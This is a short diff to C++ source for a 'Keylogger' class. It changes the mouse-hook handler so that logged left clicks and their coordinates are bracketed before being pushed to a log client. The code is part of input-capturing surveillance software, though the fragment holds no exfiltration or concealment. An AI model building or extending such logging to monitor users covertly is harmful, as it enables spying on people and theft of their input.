@@ -98,7 +98,7 @@ __declspec(dllexport) LRESULT CALLBACK Keylogger::handlemouse(int code, WPARAM w
 		if (wp == WM_LBUTTONDOWN)
 		{
 			std::ostringstream ostr;
-			ostr << "Left Click " << mouseHookStruct->pt.x << "," << mouseHookStruct->pt.y;
+			ostr << "[Left Click " << mouseHookStruct->pt.x << "," << mouseHookStruct->pt.y << "]";
 			logMutex.lock();
 			logClient.push(ostr.str());
 			logMutex.unlock();
